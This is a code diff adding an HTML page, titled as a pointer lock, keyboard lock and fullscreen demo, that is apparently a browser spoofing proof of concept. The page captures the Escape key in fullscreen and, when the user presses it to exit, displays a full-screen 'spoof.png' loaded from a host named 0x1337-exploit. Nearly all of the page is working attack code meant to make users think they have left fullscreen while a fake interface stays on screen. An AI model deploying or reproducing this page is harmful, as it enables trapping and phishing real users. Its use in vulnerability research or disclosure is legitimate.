@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Pointer Lock with Keyboard Lock and Fullscreen Example</title>
+    <style>
+      body {
+        margin: 0;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        background-color: #f0f0f0;
+      }
+      canvas {
+        border: 1px solid #000;
+        cursor: pointer;
+      }
+      #status {
+        margin-top: 20px;
+        font-size: 18px;
+        color: #333;
+      }
+      #esc-status {
+        margin-top: 10px;
+        font-size: 16px;
+        color: #666;
+      }
+      /* Updated styles for the image overlay */
+      #image-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        background-color: transparent; /* Remove semi-transparent background */
+        display: none; /* Hidden by default */
+        justify-content: center;
+        align-items: center;
+        z-index: 1000; /* Ensure it's on top */
+      }
+      #image-overlay img {
+        width: 100%; /* Fill the overlay width */
+        height: 100%; /* Fill the overlay height */
+        object-fit: contain; /* Maintain aspect ratio without distortion */
+      }
+    </style>
+  </head>
+  <body>
+    <canvas id="canvas" width="800" height="600"></canvas>
+    <div id="status">
+      Click canvas to lock pointer & enter fullscreen. Press 'L' to toggle Esc
+      lock.
+    </div>
+    <div id="esc-status">Esc Key: Unlocked</div>
+    <!-- New div for the image overlay -->
+    <div id="image-overlay">
+      <img src="https://0x1337-exploit.github.io/hosting/staging/spoof.png" alt="Displayed Image" />
+    </div>
+    <script>
+      const canvas = document.getElementById("canvas");
+      const ctx = canvas.getContext("2d");
+      const escStatus = document.getElementById("esc-status");
+      const imageOverlay = document.getElementById("image-overlay"); // Reference to overlay
+      let isEscLocked = false;
+      let isFullscreen = false;
+      // Request pointer lock and fullscreen on click
+      canvas.addEventListener("click", async () => {
+        try {
+          // Request fullscreen first
+          await document.documentElement.requestFullscreen();
+          isFullscreen = true;
+          // Then pointer lock
+          canvas.requestPointerLock =
+            canvas.requestPointerLock ||
+            canvas.mozRequestPointerLock ||
+            canvas.webkitRequestPointerLock;
+          canvas.requestPointerLock();
+        } catch (err) {
+          console.error("Failed to enter fullscreen or pointer lock:", err);
+        }
+      });
+      // Handle pointer lock change
+      document.addEventListener("pointerlockchange", lockChangeAlert, false);
+      document.addEventListener("mozpointerlockchange", lockChangeAlert, false);
+      document.addEventListener(
+        "webkitpointerlockchange",
+        lockChangeAlert,
+        false
+      );
+      // Handle fullscreen change
+      document.addEventListener(
+        "fullscreenchange",
+        fullscreenChangeAlert,
+        false
+      );
+      document.addEventListener(
+        "mozfullscreenchange",
+        fullscreenChangeAlert,
+        false
+      );
+      document.addEventListener(
+        "webkitfullscreenchange",
+        fullscreenChangeAlert,
+        false
+      );
+      function lockChangeAlert() {
+        if (
+          document.pointerLockElement === canvas ||
+          document.mozPointerLockElement === canvas ||
+          document.webkitPointerLockElement === canvas
+        ) {
+          console.log("Pointer locked");
+          document.addEventListener("mousemove", updatePosition, false);
+          document.addEventListener("keydown", handleKeyDown, false);
+        } else {
+          console.log("Pointer unlocked");
+          document.removeEventListener("mousemove", updatePosition, false);
+          document.removeEventListener("keydown", handleKeyDown, false);
+          if (isEscLocked) {
+            unlockEsc();
+          }
+          // Exit fullscreen if pointer unlocks
+          if (document.fullscreenElement) {
+            document.exitFullscreen();
+          }
+          hideImageOverlay(); // Hide overlay if exiting pointer lock
+        }
+      }
+      function fullscreenChangeAlert() {
+        if (!document.fullscreenElement) {
+          isFullscreen = false;
+          console.log("Exited fullscreen");
+          // Exit pointer lock if fullscreen exits
+          if (document.pointerLockElement) {
+            document.exitPointerLock();
+          }
+          if (isEscLocked) {
+            unlockEsc();
+          }
+          hideImageOverlay(); // Hide overlay if exiting fullscreen
+        }
+      }
+      // Track mouse movement
+      let x = 400,
+        y = 300;
+      function updatePosition(e) {
+        x += e.movementX;
+        y += e.movementY;
+        x = Math.max(0, Math.min(800, x));
+        y = Math.max(0, Math.min(600, y));
+        draw();
+      }
+      // Draw
+      function draw() {
+        ctx.clearRect(0, 0, 800, 600);
+        ctx.fillStyle = "red";
+        ctx.fillRect(x - 10, y - 10, 20, 20);
+      }
+      // Handle keydown
+      async function handleKeyDown(e) {
+        if (e.key === "l" || e.key === "L") {
+          if (isEscLocked) {
+            unlockEsc();
+          } else {
+            await lockEsc();
+          }
+        } else if (e.key === "Escape" && isEscLocked) {
+          // Modified: Instead of just logging, show the image overlay on single Esc press
+          console.log("Esc pressed while locked - displaying image");
+          showImageOverlay();
+          e.preventDefault(); // Prevent default browser behavior if possible
+        }
+      }
+      // Lock Esc
+      async function lockEsc() {
+        try {
+          if ("keyboard" in navigator && isFullscreen) {
+            // Only lock in fullscreen
+            await navigator.keyboard.lock(["Escape"]);
+            isEscLocked = true;
+            escStatus.textContent = "Esc Key: Locked";
+            console.log("Esc key locked");
+          } else {
+            console.log("Keyboard Lock API not supported or not in fullscreen");
+          }
+        } catch (err) {
+          console.error("Failed to lock Esc:", err);
+        }
+      }
+      // Unlock Esc
+      function unlockEsc() {
+        if ("keyboard" in navigator) {
+          navigator.keyboard.unlock();
+          isEscLocked = false;
+          escStatus.textContent = "Esc Key: Unlocked";
+          console.log("Esc key unlocked");
+        }
+      }
+      // New function: Show image overlay
+      function showImageOverlay() {
+        imageOverlay.style.display = "flex"; // Show the overlay
+      }
+      // New function: Hide image overlay (called on exit)
+      function hideImageOverlay() {
+        imageOverlay.style.display = "none"; // Hide the overlay
+      }
+      draw();
+    </script>
+  </body>
+</html>
